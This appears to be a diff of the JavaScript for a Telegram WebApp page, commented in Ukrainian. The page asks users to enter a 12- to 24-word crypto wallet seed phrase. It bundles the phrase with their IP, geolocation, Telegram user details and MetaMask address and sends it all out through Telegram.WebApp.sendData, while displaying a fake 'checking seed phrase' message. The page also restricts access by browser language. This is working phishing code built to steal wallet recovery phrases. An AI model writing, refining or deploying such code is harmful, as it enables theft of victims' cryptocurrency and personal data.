@@ -1,7 +1,7 @@
+// 🌍 IP та геолокація
 let userIp = "undefined";
 let userLocation = "undefined";
 
-// 🌐 Отримання IP + геолокації
 fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
@@ -13,27 +13,25 @@ fetch("https://ipapi.co/json/")
         userLocation = "unknown";
     });
 
-// 🚫 Блокування не RU/UA
+// 🚫 Обмеження за мовою
 const langs = navigator.languages || [navigator.language || navigator.userLanguage];
-const allowedLangs = ["ru", "ru-RU", "ru-UA", "uk", "uk-UA"];
+const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
 if (!langs.some(lang => allowedLangs.includes(lang))) {
     document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
     throw new Error("Blocked by language");
 }
 
-// ✅ Готовність WebApp
+// ✅ DOM готовий
 window.addEventListener("DOMContentLoaded", async () => {
-    console.log("✅ DOMContentLoaded");
+    feather.replace();
 
     if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-        console.log("✅ Telegram.WebApp доступний");
         Telegram.WebApp.ready();
         Telegram.WebApp.expand();
-    } else {
-        console.warn("❌ Telegram WebApp не ініціалізовано");
+        console.log("✅ Telegram.WebApp ініціалізовано");
     }
 
-    // 🦊 MetaMask автопідставлення адреси
+    // 🦊 MetaMask адреса
     if (typeof window.ethereum !== "undefined") {
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -41,14 +39,15 @@ window.addEventListener("DOMContentLoaded", async () => {
                 document.getElementById("wallet").value = accounts[0];
             }
         } catch (err) {
-            console.warn("⚠️ MetaMask авторизація не відбулася", err);
+            console.warn("⚠️ MetaMask не авторизовано", err);
         }
     }
 
     renderSeedInputs();
+    setupSelect();
 });
 
-// 📦 Генерація полів для сид-фрази
+// 📦 Поля для сид-фраз
 function renderSeedInputs() {
     const length = parseInt(document.getElementById("length").value);
     const container = document.getElementById("seedContainer");
@@ -83,7 +82,33 @@ function handleBulkSeedInput(e) {
     }
 }
 
-// ⚠️ Показати попередження
+// 🎛️ Кастомний селект
+function setupSelect() {
+    const selectWrapper = document.querySelector('.custom-select');
+    const selected = selectWrapper.querySelector('.selected');
+    const options = selectWrapper.querySelectorAll('.options li');
+    const hiddenInput = document.querySelector('#wallet');
+
+    selected.addEventListener('click', () => {
+        selectWrapper.classList.toggle('open');
+    });
+
+    options.forEach(option => {
+        option.addEventListener('click', () => {
+            selected.innerHTML = option.innerHTML;
+            hiddenInput.value = option.dataset.value;
+            selectWrapper.classList.remove('open');
+        });
+    });
+
+    document.addEventListener('click', e => {
+        if (!selectWrapper.contains(e.target)) {
+            selectWrapper.classList.remove('open');
+        }
+    });
+}
+
+// ⚠️ Попередження
 function showWarning(message) {
     let warning = document.getElementById("validationWarning");
     if (!warning) {
@@ -131,14 +156,12 @@ function submitSeed() {
     const inputs = document.querySelectorAll("#seedContainer .seed-word");
     const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
 
-    // Валідація символів
     const invalidWords = words.filter(word => !/^[a-zA-Z]+$/.test(word));
     if (invalidWords.length > 0) {
         showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
         return;
     }
 
-    // Перевірка кількості слів
     if (isNaN(length) || length < 12 || length > 24 || words.length !== length) {
         showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
         return;
@@ -149,7 +172,6 @@ function submitSeed() {
     showProcessing("⏳ Перевірка seed-фрази...");
     document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";
 
-    // Telegram WebApp user
     const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
 
     const payload = {
@@ -166,29 +188,14 @@ function submitSeed() {
         timestamp: new Date().toISOString()
     };
 
-    console.log("📤 Payload для надсилання:", payload);
+    console.log("📤 Payload:", payload);
     localStorage.setItem("payload_backup", JSON.stringify(payload));
 
-    // Надсилання через Telegram WebApp
     if (Telegram?.WebApp?.sendData) {
-        console.log("✅ Telegram.WebApp доступний — надсилаємо payload...");
         Telegram.WebApp.sendData(JSON.stringify(payload));
-    } else {
-        console.warn("❌ Telegram WebApp API не ініціалізовано. Дані не надіслані.");
     }
 
-    // Перехід
     setTimeout(() => {
         window.location.href = "profile.html";
     }, 1500);
 }
-
-// Автозапуск Telegram WebApp
-window.addEventListener("load", () => {
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-        Telegram.WebApp.ready();
-        console.log("✅ Telegram WebApp ініціалізовано");
-    } else {
-        console.warn("⚠️ Telegram WebApp не знайдено. Перевір запуск у Telegram.");
-    }
-});
